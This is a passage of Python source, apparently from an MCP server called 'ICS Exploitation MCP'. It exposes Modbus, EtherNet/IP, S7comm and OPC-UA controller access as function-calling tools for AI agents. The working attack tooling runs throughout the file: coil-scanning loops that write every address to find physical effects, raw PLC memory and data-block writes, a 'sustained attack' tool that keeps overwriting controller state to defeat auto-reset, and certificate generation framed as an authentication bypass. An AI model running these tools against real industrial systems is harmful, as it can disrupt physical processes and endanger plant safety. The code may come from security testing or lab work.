            # Read banner/menu
            banner = self._recv_all(2.0)
            
            self.host = host
            self.port = port
            self.timeout = timeout
            self.connected = True
            
            return {
                "success": True,
                "connected": True,
                "host": host,
                "port": port,
                "banner": banner.strip() if banner else ""
            }
        except socket.timeout:
            return {"success": False, "error": "Connection timeout"}
        except ConnectionRefusedError:
            return {"success": False, "error": "Connection refused"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def disconnect(self) -> Dict[str, Any]:
        """Close connection to Modbus CLI server"""
        try:
            if self.sock:
                self.sock.close()
            self.sock = None
            self.connected = False
            return {"success": True, "disconnected": True}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _recv_all(self, timeout: float = 0.5) -> str:
        """Receive all available data from socket"""
        self.sock.setblocking(False)
        data = b""
        end_time = time.time() + timeout
        
        while time.time() < end_time:
            try:
                chunk = self.sock.recv(4096)
                if chunk:
                    data += chunk
                else:
                    break
            except BlockingIOError:
                time.sleep(0.05)
            except Exception:
                break
        
        self.sock.setblocking(True)
        self.sock.settimeout(self.timeout)
        return data.decode('utf-8', errors='replace')
    
    def _send_command(self, cmd: str, wait: float = 0.3) -> str:
        """Send command and receive response"""
        if not self.connected or not self.sock:
            raise ConnectionError("Not connected to Modbus server")
        
        self.sock.send(f"{cmd}\n".encode())
        time.sleep(wait)
        return self._recv_all(1.0)
    
    def get_status(self) -> Dict[str, Any]:
        """
        Get system status (menu option 1).
        
        Returns:
            Dict with parsed status fields
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        try:
            response = self._send_command(self.menu_status_option)
            
            # Try to parse JSON from response
            status_data = None
            for line in response.split('\n'):
                line = line.strip()
                if line.startswith('{'):
                    try:
                        status_data = json.loads(line)
                        break
                    except json.JSONDecodeError:
                        pass
            
            return {
                "success": True,
                "raw_response": response,
                "status": status_data
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def send_modbus_raw(self, hex_command: str) -> Dict[str, Any]:
        """
        Send raw Modbus command (hex string, no spaces).
        
        Args:
            hex_command: Modbus command as hex string (e.g., "010500000FF00")
        
        Returns:
            Dict with response
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        # Remove spaces if present
        hex_command = hex_command.replace(" ", "").upper()
        
        try:
            # Select command option
            self._send_command(self.menu_command_option, 0.2)
            
            # Send the hex command
            response = self._send_command(hex_command)
            
            success = "sent" in response.lower() or "success" in response.lower()
            error = None
            if "invalid" in response.lower() or "error" in response.lower():
                success = False
                error = response.strip()
            
            return {
                "success": success,
                "command": hex_command,
                "raw_response": response,
                "error": error
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def write_coil(self, address: int, value: bool, unit_id: int = 1) -> Dict[str, Any]:
        """
        Write single coil (Modbus function code 05).
        
        Args:
            address: Coil address (0-65535)
            value: True=ON, False=OFF
            unit_id: Modbus unit ID (default 1)
        
        Returns:
            Dict with result
        """
        # Format: [Unit ID] [FC 05] [Address High] [Address Low] [Value High] [Value Low]
        # Value: FF00 = ON, 0000 = OFF
        value_hex = "FF00" if value else "0000"
        cmd = f"{unit_id:02X}05{address:04X}{value_hex}"
        
        result = self.send_modbus_raw(cmd)
        result["function"] = "write_coil"
        result["address"] = address
        result["value"] = value
        return result
    
    def write_register(self, address: int, value: int, unit_id: int = 1) -> Dict[str, Any]:
        """
        Write single register (Modbus function code 06).
        
        Args:
            address: Register address (0-65535)
            value: Value to write (0-65535)
            unit_id: Modbus unit ID (default 1)
        
        Returns:
            Dict with result
        """
        # Format: [Unit ID] [FC 06] [Address High] [Address Low] [Value High] [Value Low]
        cmd = f"{unit_id:02X}06{address:04X}{value:04X}"
        
        result = self.send_modbus_raw(cmd)
        result["function"] = "write_register"
        result["address"] = address
        result["value"] = value
        return result
    
    def read_coils(self, address: int, count: int = 1, unit_id: int = 1) -> Dict[str, Any]:
        """
        Read coils (Modbus function code 01).
        
        Args:
            address: Starting coil address
            count: Number of coils to read
            unit_id: Modbus unit ID
        
        Returns:
            Dict with result
        """
        cmd = f"{unit_id:02X}01{address:04X}{count:04X}"
        result = self.send_modbus_raw(cmd)
        result["function"] = "read_coils"
        result["address"] = address
        result["count"] = count
        return result
    
    def read_registers(self, address: int, count: int = 1, unit_id: int = 1) -> Dict[str, Any]:
        """
        Read holding registers (Modbus function code 03).
        
        Args:
            address: Starting register address
            count: Number of registers to read
            unit_id: Modbus unit ID
        
        Returns:
            Dict with result
        """
        cmd = f"{unit_id:02X}03{address:04X}{count:04X}"
        result = self.send_modbus_raw(cmd)
        result["function"] = "read_registers"
        result["address"] = address
        result["count"] = count
        return result
    
    def scan_coils(self, start: int = 0, end: int = 16, unit_id: int = 1,
                   status_option: str = "1") -> Dict[str, Any]:
        """
        Scan coils to find which addresses affect the system.
        
        Args:
            start: Starting address
            end: Ending address
            unit_id: Modbus unit ID
            status_option: Menu option to get status
        
        Returns:
            Dict with scan results showing which coils changed status
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        results = []
        
        # Get initial status
        initial = self.get_status()
        initial_status = initial.get("status", {})
        
        for addr in range(start, end):
            # Write coil ON
            self.write_coil(addr, True, unit_id)
            time.sleep(0.2)
            
            # Check status
            after = self.get_status()
            after_status = after.get("status", {})
            
            # Find changes
            changes = {}
            for key in after_status:
                if after_status.get(key) != initial_status.get(key):
                    changes[key] = {
                        "before": initial_status.get(key),
                        "after": after_status.get(key)
                    }
            
            if changes:
                results.append({
                    "address": addr,
                    "changes": changes
                })
            
            # Reset coil
            self.write_coil(addr, False, unit_id)
            time.sleep(0.1)
        
        return {
            "success": True,
            "scan_type": "coils",
            "range": f"{start}-{end}",
            "results": results,
            "addresses_with_effect": [r["address"] for r in results]
        }
    
    def scan_write_coils(self, start: int = 0, end: int = 10, 
                         set_value: bool = True, unit_id: int = 1) -> Dict[str, Any]:
        """
        Scan a range of coils and write a value to each, observing status changes.
        
        Args:
            start: Starting coil address
            end: Ending coil address (exclusive)
            set_value: Value to write to each coil (True or False)
            unit_id: Modbus unit ID
        
        Returns:
            Dict with initial/final status and list of coils written
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        # Get initial status
        initial = self.get_status()
        initial_status = initial.get("status", {})
        
        coils_written = []
        status_after_each = []
        
        # Write to each coil in range
        for addr in range(start, end):
            self.write_coil(addr, set_value, unit_id)
            coils_written.append(addr)
            time.sleep(0.3)
            
            # Get status after this write
            status = self.get_status()
            status_after_each.append({
                "coil_address": addr,
                "status": status.get("status", {})
            })
        
        # Final status check
        final = self.get_status()
        final_status = final.get("status", {})
        
        return {
            "success": True,
            "initial_status": initial_status,
            "final_status": final_status,
            "coils_written": coils_written,
            "status_history": status_after_each
        }
    
    def get_capabilities(self) -> Dict[str, Any]:
        """Get Modbus CLI toolkit capabilities"""
        return {
            "protocol": "Modbus",
            "description": "Modbus CLI toolkit for menu-driven interfaces",
            "function_codes": {
                "01": "Read Coils",
                "02": "Read Discrete Inputs",
                "03": "Read Holding Registers",
                "04": "Read Input Registers",
                "05": "Write Single Coil",
                "06": "Write Single Register",
            },
            "methods": [
                {"name": "connect", "description": "Connect to Modbus CLI server"},
                {"name": "disconnect", "description": "Close connection"},
                {"name": "get_status", "description": "Get system status"},
                {"name": "send_modbus_raw", "description": "Send raw Modbus command"},
                {"name": "write_coil", "description": "Write single coil (FC 05)"},
                {"name": "write_register", "description": "Write single register (FC 06)"},
                {"name": "read_coils", "description": "Read coils (FC 01)"},
                {"name": "read_registers", "description": "Read holding registers (FC 03)"},
                {"name": "scan_coils", "description": "Scan coils to find effects"},
                {"name": "scan_write_coils", "description": "Scan and write to coil range"},
            ]
        }


# =============================================================================
# ETHERNET/IP TOOLKIT
# =============================================================================

class EtherNetIPToolkit:
    """
    EtherNet/IP Toolkit for CIP protocol communication.
    
    EtherNet/IP uses CIP (Common Industrial Protocol) over TCP/IP.
    Standard port is 44818.
    
    CIP Object Model:
        - Class: Object type (e.g., 0x02 = Message Router, 0x01 = Identity)
        - Instance: Specific object within class
        - Attribute: Data field within instance
    
    Common CIP Classes:
        - 0x01: Identity Object
        - 0x02: Message Router Object
        - 0x04: Assembly Object
        - 0x06: Connection Manager
        - 0xAC: Symbol Object (for tag access)
    
    Example:
        toolkit = EtherNetIPToolkit()
        
        # Connect to controller
        toolkit.connect("192.168.1.1")
        
        # Read a tag
        result = toolkit.read_tag("Status")
        
        # Get device identity
        identity = toolkit.get_identity()
        
        # Read CIP object
        data = toolkit.read_cip_object(0x02, 1)  # Message Router, instance 1
    """
    
    def __init__(self):
        """Initialize EtherNet/IP toolkit"""
        self.driver = None
        self.cip_driver = None
        self.host = None
        self.port = 44818
        self.connected = False
    
    def connect(self, host: str, port: int = 44818) -> Dict[str, Any]:
        """
        Connect to EtherNet/IP controller.
        
        Args:
            host: Target IP address
            port: EtherNet/IP port (default 44818)
        
        Returns:
            Connection status and device info
        """
        if not PYCOMM3_AVAILABLE:
            return {
                "success": False,
                "error": "pycomm3 not installed. Install with: pip install pycomm3"
            }
        
        try:
            self.host = host
            self.port = port
            
            # Try LogixDriver first for tag-based access
            target = f"{host}:{port}" if port != 44818 else host
            
            try:
                self.driver = LogixDriver(target)
                self.driver.open()
                
                info = {
                    "name": getattr(self.driver, 'name', 'Unknown'),
                    "vendor": getattr(self.driver, 'vendor', 'Unknown'),
                    "product_type": getattr(self.driver, 'product_type', 'Unknown'),
                    "product_name": getattr(self.driver, 'product_name', 'Unknown'),
                    "revision": getattr(self.driver, 'revision', 'Unknown'),
                    "serial": getattr(self.driver, 'serial_number', 'Unknown'),
                }
                
                self.connected = True
                return {
                    "success": True,
                    "connected": True,
                    "host": host,
                    "port": port,
                    "driver_type": "LogixDriver",
                    "device_info": info
                }
            except Exception as e:
                # Fall back to CIPDriver for low-level access
                self.driver = None
                self.cip_driver = CIPDriver(target)
                self.cip_driver.open()
                self.connected = True
                
                return {
                    "success": True,
                    "connected": True,
                    "host": host,
                    "port": port,
                    "driver_type": "CIPDriver",
                    "note": f"Using CIPDriver (LogixDriver failed: {str(e)[:50]})"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "host": host,
                "port": port
            }
    
    def disconnect(self) -> Dict[str, Any]:
        """Disconnect from controller"""
        try:
            if self.driver:
                self.driver.close()
                self.driver = None
            if self.cip_driver:
                self.cip_driver.close()
                self.cip_driver = None
            self.connected = False
            return {"success": True, "disconnected": True}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def get_identity(self) -> Dict[str, Any]:
        """
        Get device identity information.
        
        Returns:
            Device identity including vendor, product, serial, etc.
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        try:
            if self.driver:
                return {
                    "success": True,
                    "identity": {
                        "name": getattr(self.driver, 'name', 'Unknown'),
                        "vendor": getattr(self.driver, 'vendor', 'Unknown'),
                        "product_type": getattr(self.driver, 'product_type', 'Unknown'),
                        "product_name": getattr(self.driver, 'product_name', 'Unknown'),
                        "revision": getattr(self.driver, 'revision', 'Unknown'),
                        "serial": getattr(self.driver, 'serial_number', 'Unknown'),
                    }
                }
            else:
                # Use CIP Identity object (class 0x01)
                identity_data = self.read_cip_object(0x01, 1)
                return identity_data
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def read_tag(self, tag_name: str) -> Dict[str, Any]:
        """
        Read a tag value from the PLC.
        
        Args:
            tag_name: Name of the tag to read
        
        Returns:
            Tag value and metadata
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        if not self.driver:
            return {"success": False, "error": "LogixDriver required for tag access. Use read_cip_object for low-level access."}
        
        try:
            result = self.driver.read(tag_name)
            
            if result.error:
                return {
                    "success": False,
                    "tag": tag_name,
                    "error": result.error
                }
            
            return {
                "success": True,
                "tag": tag_name,
                "value": result.value,
                "type": str(result.type) if hasattr(result, 'type') else None
            }
        except Exception as e:
            return {"success": False, "tag": tag_name, "error": str(e)}
    
    def write_tag(self, tag_name: str, value: Any) -> Dict[str, Any]:
        """
        Write a value to a PLC tag.
        
        Args:
            tag_name: Name of the tag to write
            value: Value to write
        
        Returns:
            Write status
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        if not self.driver:
            return {"success": False, "error": "LogixDriver required for tag access"}
        
        try:
            result = self.driver.write(tag_name, value)
            
            if result.error:
                return {
                    "success": False,
                    "tag": tag_name,
                    "error": result.error
                }
            
            return {
                "success": True,
                "tag": tag_name,
                "value": value,
                "written": True
            }
        except Exception as e:
            return {"success": False, "tag": tag_name, "error": str(e)}
    
    def list_tags(self) -> Dict[str, Any]:
        """
        List all available tags on the PLC.
        
        Returns:
            List of tag names and types
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        if not self.driver:
            return {"success": False, "error": "LogixDriver required for tag listing"}
        
        try:
            tags = self.driver.get_tag_list()
            tag_list = []
            
            for tag in tags:
                tag_list.append({
                    "name": tag.tag_name if hasattr(tag, 'tag_name') else str(tag),
                    "type": str(tag.data_type) if hasattr(tag, 'data_type') else None,
                    "dim": tag.dimensions if hasattr(tag, 'dimensions') else None
                })
            
            return {
                "success": True,
                "tag_count": len(tag_list),
                "tags": tag_list[:100]  # Limit to first 100
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def read_cip_object(self, class_id: int, instance: int, attribute: int = None) -> Dict[str, Any]:
        """
        Read from a CIP object using Get_Attributes_All or Get_Attribute_Single.
        
        Args:
            class_id: CIP class ID (e.g., 0x01=Identity, 0x02=Message Router)
            instance: Instance number
            attribute: Specific attribute (optional, None = Get_Attributes_All)
        
        Returns:
            Raw data and decoded values
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        try:
            driver = self.cip_driver or self.driver
            
            if attribute is not None:
                # Get specific attribute
                response = driver.generic_message(
                    service=Services.get_attribute_single,
                    class_code=class_id,
                    instance=instance,
                    attribute=attribute,
                    connected=False,
                    unconnected_send=True
                )
            else:
                # Get all attributes
                response = driver.generic_message(
                    service=Services.get_attributes_all,
                    class_code=class_id,
                    instance=instance,
                    connected=False,
                    unconnected_send=True
                )
            
            if response.error:
                return {
                    "success": False,
                    "class_id": hex(class_id),
                    "instance": instance,
                    "attribute": attribute,
                    "error": response.error
                }
            
            raw_data = response.value
            
            # Try to decode as various formats
            decoded = {}
            if raw_data:
                # Try UTF-16-LE decoding (common in some systems)
                try:
                    utf16_text = raw_data.decode('utf-16-le').rstrip('\x00')
                    if utf16_text.isprintable() and len(utf16_text) > 0:
                        decoded['utf16_le'] = utf16_text
                except:
                    pass
                
                # Try UTF-8 decoding
                try:
                    utf8_text = raw_data.decode('utf-8').rstrip('\x00')
                    if utf8_text.isprintable() and len(utf8_text) > 0:
                        decoded['utf8'] = utf8_text
                except:
                    pass
                
                # Try ASCII decoding
                try:
                    ascii_text = raw_data.decode('ascii').rstrip('\x00')
                    if ascii_text.isprintable() and len(ascii_text) > 0:
                        decoded['ascii'] = ascii_text
                except:
                    pass
            
            return {
                "success": True,
                "class_id": hex(class_id),
                "instance": instance,
                "attribute": attribute,
                "raw_hex": raw_data.hex() if raw_data else None,
                "raw_length": len(raw_data) if raw_data else 0,
                "decoded": decoded if decoded else None
            }
            
        except Exception as e:
            return {
                "success": False,
                "class_id": hex(class_id),
                "instance": instance,
                "error": str(e)
            }
    
    def enumerate_cip_objects(self, class_ids: List[int] = None, max_instances: int = 5) -> Dict[str, Any]:
        """
        Enumerate CIP objects to find interesting data.
        
        Args:
            class_ids: List of class IDs to check (default: common classes)
            max_instances: Maximum instances per class to check
        
        Returns:
            Found objects and their data
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        if class_ids is None:
            class_ids = [0x01, 0x02, 0x04, 0x06, 0xAC]  # Identity, Message Router, Assembly, Connection Manager, Symbol
        
        results = []
        
        for class_id in class_ids:
            for instance in range(1, max_instances + 1):
                try:
                    result = self.read_cip_object(class_id, instance)
                    if result.get("success"):
                        results.append({
                            "class_id": hex(class_id),
                            "instance": instance,
                            "raw_length": result.get("raw_length", 0),
                            "decoded": result.get("decoded")
                        })
                except:
                    pass
        
        return {
            "success": True,
            "objects_found": len(results),
            "results": results
        }
    
    def get_documentation(self) -> Dict[str, Any]:
        """Return protocol documentation"""
        return {
            "protocol": "EtherNet/IP",
            "description": "EtherNet/IP with CIP (Common Industrial Protocol)",
            "default_port": 44818,
            "cip_classes": {
                "0x01": "Identity Object",
                "0x02": "Message Router Object",
                "0x04": "Assembly Object",
                "0x06": "Connection Manager",
                "0xAC": "Symbol Object (tags)"
            },
            "methods": [
                {"name": "connect", "description": "Connect to EtherNet/IP controller"},
                {"name": "disconnect", "description": "Close connection"},
                {"name": "get_identity", "description": "Get device identity"},
                {"name": "read_tag", "description": "Read PLC tag by name"},
                {"name": "write_tag", "description": "Write PLC tag"},
                {"name": "list_tags", "description": "List available tags"},
                {"name": "read_cip_object", "description": "Read CIP object (class/instance/attribute)"},
                {"name": "enumerate_cip_objects", "description": "Scan for CIP objects"}
            ]
        }


# =============================================================================
# UNIFIED ICS EXPLOITATION MCP
# =============================================================================

class ICSExploitationMCP:
    """
    Unified ICS Exploitation MCP Server.
    
    Combines OPC-UA, S7comm, BACnet, Modbus, and EtherNet/IP toolkits for comprehensive ICS security assessment.
    
    Usage:
        mcp = ICSExploitationMCP()
        
        # OPC-UA operations via mcp.opcua
        mcp.opcua.enumerate_endpoints("opc.tcp://target:4840")
        
        # S7comm operations via mcp.s7
        mcp.s7.connect("192.168.1.1", 0, 0, 102)
        
        # BACnet operations via mcp.bacnet
        mcp.bacnet.connect("192.168.1.1", 48103)
        
        # Modbus operations via mcp.modbus
        mcp.modbus.connect("192.168.1.1", 502)
        
        # EtherNet/IP operations via mcp.ethernetip
        mcp.ethernetip.connect("192.168.1.1", 44818)
    """
    
    def __init__(self):
        """Initialize unified MCP with all toolkits"""
        self.name = "ics-exploitation-mcp"
        self.version = "1.2.0"
        
        # Initialize all toolkits
        self.opcua = OPCUAToolkit()
        self.s7 = Snap7Toolkit()
        self.bacnet = BACnetToolkit()
        self.modbus = ModbusCLIToolkit()
        self.ethernetip = EtherNetIPToolkit()
    
    def check_installation(self) -> Dict[str, Any]:
        """Check installation status of all protocols"""
        return {
            "mcp_name": self.name,
            "version": self.version,
            "protocols": {
                "opcua": {
                    "available": OPCUA_AVAILABLE and CRYPTO_AVAILABLE,
                    "opcua_lib": OPCUA_AVAILABLE,
                    "cryptography_lib": CRYPTO_AVAILABLE,
                    "install": "pip install opcua cryptography"
                },
                "s7comm": {
                    "available": SNAP7_AVAILABLE,
                    "snap7_lib": SNAP7_AVAILABLE,
                    "install": "pip install python-snap7"
                },
                "bacnet": {
                    "available": True,  # Uses standard socket library
                    "socket_lib": True,
                    "install": "No additional dependencies (uses socket)"
                },
                "modbus": {
                    "available": True,  # Uses standard socket library
                    "socket_lib": True,
                    "install": "No additional dependencies (uses socket)"
                },
                "ethernetip": {
                    "available": PYCOMM3_AVAILABLE,
                    "pycomm3_lib": PYCOMM3_AVAILABLE,
                    "install": "pip install pycomm3"
                }
            },
            "utilities": {
                "requests": REQUESTS_AVAILABLE,
                "mcp": True  # If we got here, MCP is working
            },
            "any_protocol_ready": True  # BACnet and Modbus always ready (use socket)
        }
    
    def list_capabilities(self) -> Dict[str, Any]:
        """List all available tools across all protocols"""
        return {
            "mcp_name": self.name,
            "version": self.version,
            "description": "Unified ICS Exploitation Toolkit for OPC-UA, S7comm, BACnet, Modbus, and EtherNet/IP protocols",
            "protocols": {
                "opcua": self.opcua.list_capabilities() if OPCUA_AVAILABLE else {"error": "not installed"},
                "s7comm": self.s7.list_capabilities() if SNAP7_AVAILABLE else {"error": "not installed"},
                "bacnet": self.bacnet.get_capabilities(),
                "modbus": self.modbus.get_capabilities(),
                "ethernetip": self.ethernetip.get_documentation() if PYCOMM3_AVAILABLE else {"error": "not installed"}
            },
            "tool_count": {
                "opcua": 11 if OPCUA_AVAILABLE else 0,
                "s7comm": 17 if SNAP7_AVAILABLE else 0,
                "bacnet": 10,
                "modbus": 10,
                "ethernetip": 8 if PYCOMM3_AVAILABLE else 0,
                "general": 3
            }
        }
    
    def get_documentation(self, protocol: str = "general") -> Dict[str, Any]:
        """Get documentation for a specific protocol"""
        if protocol == "general":
            return {
                "mcp_name": self.name,
                "overview": """
ICS Exploitation MCP - Unified Industrial Control Systems Security Toolkit

SUPPORTED PROTOCOLS:
- OPC-UA: Universal protocol for PLCs (Siemens, ABB, Rockwell, etc.)
- S7comm: Siemens S7 PLC communication (S7-300/400/1200/1500)

QUICK START - OPC-UA:
1. opcua_enumerate_endpoints("opc.tcp://target:4840")
2. opcua_generate_cert("./certs")
3. opcua_connect("opc.tcp://target:4840", "./certs/client_cert.pem", 
                  "./certs/client_key.pem", "Basic256Sha256", "SignAndEncrypt")
4. opcua_find_writable()
5. opcua_write("ns=2;i=1", "false", "Boolean")

QUICK START - S7comm:
1. s7_connect("192.168.1.1", 0, 0, 102)
2. s7_list_blocks()
3. s7_db_read(1, 0, 100)
4. s7_db_write(1, 0, "FF00FF00")
5. s7_disconnect()
""",
                "protocols_available": {
                    "opcua": OPCUA_AVAILABLE,
                    "s7comm": SNAP7_AVAILABLE
                }
            }
        elif protocol == "opcua":
            return self.opcua.list_capabilities()
        elif protocol == "s7comm" or protocol == "s7":
            return self.s7.get_documentation("general")
        else:
            return {"error": f"Unknown protocol: {protocol}", "valid": ["general", "opcua", "s7comm"]}
    
    # =========================================================================
    # MCP TOOL DEFINITIONS
    # =========================================================================
    
    def get_tools(self) -> List[Dict[str, Any]]:
        """Return tool definitions in OpenAI/Anthropic function calling format"""
        tools = [
            # General tools
            {"type": "function", "function": {"name": "ics_check_installation", "description": "Check installation status of all ICS protocols (OPC-UA, S7comm)", "parameters": {"type": "object", "properties": {}, "required": []}}},
            {"type": "function", "function": {"name": "ics_list_capabilities", "description": "List all available ICS exploitation tools", "parameters": {"type": "object", "properties": {}, "required": []}}},
            {"type": "function", "function": {"name": "ics_get_documentation", "description": "Get documentation for ICS protocols", "parameters": {"type": "object", "properties": {"protocol": {"type": "string", "description": "Protocol: general, opcua, or s7comm", "default": "general"}}, "required": []}}},
        ]
        
        # OPC-UA tools
        if OPCUA_AVAILABLE:
            tools.extend([
                {"type": "function", "function": {"name": "opcua_enumerate_endpoints", "description": "Enumerate OPC-UA server endpoints to discover security requirements", "parameters": {"type": "object", "properties": {"url": {"type": "string", "description": "OPC-UA server URL (e.g., opc.tcp://target:4840)"}}, "required": ["url"]}}},
                {"type": "function", "function": {"name": "opcua_generate_cert", "description": "Generate self-signed certificate for OPC-UA authentication bypass", "parameters": {"type": "object", "properties": {"output_dir": {"type": "string", "description": "Directory to save certificates", "default": "."}}, "required": []}}},
                {"type": "function", "function": {"name": "opcua_connect", "description": "Connect to OPC-UA server with security settings", "parameters": {"type": "object", "properties": {"url": {"type": "string", "description": "OPC-UA server URL"}, "cert_path": {"type": "string", "description": "Path to client certificate"}, "key_path": {"type": "string", "description": "Path to client private key"}, "security_policy": {"type": "string", "description": "Security policy (None, Basic256Sha256, Basic256, Basic128Rsa15)", "default": "None"}, "security_mode": {"type": "string", "description": "Security mode (None, Sign, SignAndEncrypt)", "default": "None"}}, "required": ["url"]}}},
                {"type": "function", "function": {"name": "opcua_disconnect", "description": "Disconnect from OPC-UA server", "parameters": {"type": "object", "properties": {}, "required": []}}},
                {"type": "function", "function": {"name": "opcua_enumerate_nodes", "description": "Enumerate OPC-UA node hierarchy with access level detection", "parameters": {"type": "object", "properties": {"max_depth": {"type": "integer", "description": "Maximum recursion depth", "default": 5}}, "required": []}}},
                {"type": "function", "function": {"name": "opcua_find_writable", "description": "Find all writable variables (attack surface)", "parameters": {"type": "object", "properties": {"max_depth": {"type": "integer", "description": "Maximum recursion depth", "default": 5}}, "required": []}}},
                {"type": "function", "function": {"name": "opcua_get_node_info", "description": "Get detailed information about a specific OPC-UA node", "parameters": {"type": "object", "properties": {"node_id": {"type": "string", "description": "OPC-UA node ID"}}, "required": ["node_id"]}}},
                {"type": "function", "function": {"name": "opcua_read", "description": "Read an OPC-UA variable's current value", "parameters": {"type": "object", "properties": {"node_id": {"type": "string", "description": "OPC-UA node ID"}}, "required": ["node_id"]}}},
                {"type": "function", "function": {"name": "opcua_write", "description": "Write a value to an OPC-UA variable", "parameters": {"type": "object", "properties": {"node_id": {"type": "string", "description": "OPC-UA node ID"}, "value": {"type": "string", "description": "Value to write"}, "data_type": {"type": "string", "description": "Data type (auto, Boolean, Double, Int32, etc.)", "default": "auto"}}, "required": ["node_id", "value"]}}},
            ])
        
        # S7comm tools
        if SNAP7_AVAILABLE:
            tools.extend([
                {"type": "function", "function": {"name": "s7_connect", "description": "Connect to Siemens S7 PLC. The 4th parameter is TCP port.", "parameters": {"type": "object", "properties": {"ip": {"type": "string", "description": "Target IP address"}, "rack": {"type": "integer", "description": "PLC rack number (usually 0)", "default": 0}, "slot": {"type": "integer", "description": "PLC slot number (0 for S7-300)", "default": 0}, "port": {"type": "integer", "description": "TCP port (102 standard, some systems use non-standard)", "default": 102}}, "required": ["ip"]}}},
                {"type": "function", "function": {"name": "s7_disconnect", "description": "Disconnect from S7 PLC", "parameters": {"type": "object", "properties": {}, "required": []}}},
                {"type": "function", "function": {"name": "s7_is_connected", "description": "Check if connected to S7 PLC", "parameters": {"type": "object", "properties": {}, "required": []}}},
                {"type": "function", "function": {"name": "s7_get_cpu_info", "description": "Get S7 CPU module information (type, serial number)", "parameters": {"type": "object", "properties": {}, "required": []}}},
                {"type": "function", "function": {"name": "s7_get_cpu_state", "description": "Get S7 CPU run state (Run/Stop)", "parameters": {"type": "object", "properties": {}, "required": []}}},
                {"type": "function", "function": {"name": "s7_list_blocks", "description": "List all blocks on S7 PLC (DBs, FBs, FCs, etc.)", "parameters": {"type": "object", "properties": {}, "required": []}}},
                {"type": "function", "function": {"name": "s7_db_read", "description": "Read data from an S7 data block", "parameters": {"type": "object", "properties": {"db_number": {"type": "integer", "description": "Data block number (e.g., 1 for DB1)"}, "offset": {"type": "integer", "description": "Byte offset to start reading", "default": 0}, "size": {"type": "integer", "description": "Number of bytes to read", "default": 100}}, "required": ["db_number"]}}},
                {"type": "function", "function": {"name": "s7_db_write", "description": "Write data to an S7 data block. Data can be hex string like 'FF00FF00'", "parameters": {"type": "object", "properties": {"db_number": {"type": "integer", "description": "Data block number"}, "offset": {"type": "integer", "description": "Byte offset to start writing"}, "data": {"type": "string", "description": "Data as hex string (e.g., 'FF00FF00')"}}, "required": ["db_number", "offset", "data"]}}},
                {"type": "function", "function": {"name": "s7_db_get_size", "description": "Get the size of an S7 data block in bytes", "parameters": {"type": "object", "properties": {"db_number": {"type": "integer", "description": "Data block number"}}, "required": ["db_number"]}}},
                {"type": "function", "function": {"name": "s7_read_area", "description": "Read from S7 memory area (DB, PE, PA, MK, CT, TM)", "parameters": {"type": "object", "properties": {"area": {"type": "string", "description": "Memory area: DB, PE, PA, MK, CT, TM"}, "db_number": {"type": "integer", "description": "DB number (only for area=DB)", "default": 0}, "start": {"type": "integer", "description": "Start byte offset", "default": 0}, "size": {"type": "integer", "description": "Number of bytes to read", "default": 100}}, "required": ["area"]}}},
                {"type": "function", "function": {"name": "s7_write_area", "description": "Write to S7 memory area", "parameters": {"type": "object", "properties": {"area": {"type": "string", "description": "Memory area: DB, PE, PA, MK"}, "db_number": {"type": "integer", "description": "DB number (only for area=DB)", "default": 0}, "start": {"type": "integer", "description": "Start byte offset", "default": 0}, "data": {"type": "string", "description": "Data as hex string"}}, "required": ["area", "data"]}}},
                {"type": "function", "function": {"name": "s7_sustained_attack", "description": "Continuously write payload to maintain state (for systems with auto-reset)", "parameters": {"type": "object", "properties": {"db_number": {"type": "integer", "description": "Data block number"}, "offset": {"type": "integer", "description": "Byte offset"}, "data": {"type": "string", "description": "Hex string payload"}, "duration_seconds": {"type": "integer", "description": "Duration in seconds", "default": 60}, "interval_ms": {"type": "integer", "description": "Milliseconds between writes", "default": 200}, "status_url": {"type": "string", "description": "Optional HMI URL to poll for status"}}, "required": ["db_number", "offset", "data"]}}},
                {"type": "function", "function": {"name": "s7_sustained_attack_multi", "description": "Continuously write to multiple offsets to maintain state", "parameters": {"type": "object", "properties": {"db_number": {"type": "integer", "description": "Data block number"}, "writes": {"type": "array", "description": "List of write operations: [{\"offset\": 32, \"data\": \"00FF\"}, ...]", "items": {"type": "object", "properties": {"offset": {"type": "integer"}, "data": {"type": "string"}}}}, "duration_seconds": {"type": "integer", "description": "Duration in seconds", "default": 60}, "interval_ms": {"type": "integer", "description": "Milliseconds between write cycles", "default": 200}, "status_url": {"type": "string", "description": "Optional HMI URL to poll for status"}}, "required": ["db_number", "writes"]}}},
                {"type": "function", "function": {"name": "s7_db_write_typed", "description": "Write value with proper S7 data type encoding (handles signed/unsigned correctly)", "parameters": {"type": "object", "properties": {"db_number": {"type": "integer", "description": "Data block number"}, "offset": {"type": "integer", "description": "Byte offset"}, "value": {"description": "Value to write"}, "data_type": {"type": "string", "description": "S7 type: BOOL, BYTE, SINT, INT, UINT, DINT, UDINT, REAL, STRING", "default": "BYTE"}}, "required": ["db_number", "offset", "value"]}}},
                {"type": "function", "function": {"name": "s7_monitor_status", "description": "Poll an HMI/API endpoint for status changes", "parameters": {"type": "object", "properties": {"status_url": {"type": "string", "description": "URL to poll"}, "interval_ms": {"type": "integer", "description": "Polling interval", "default": 500}, "duration_seconds": {"type": "integer", "description": "Monitor duration", "default": 30}}, "required": ["status_url"]}}},
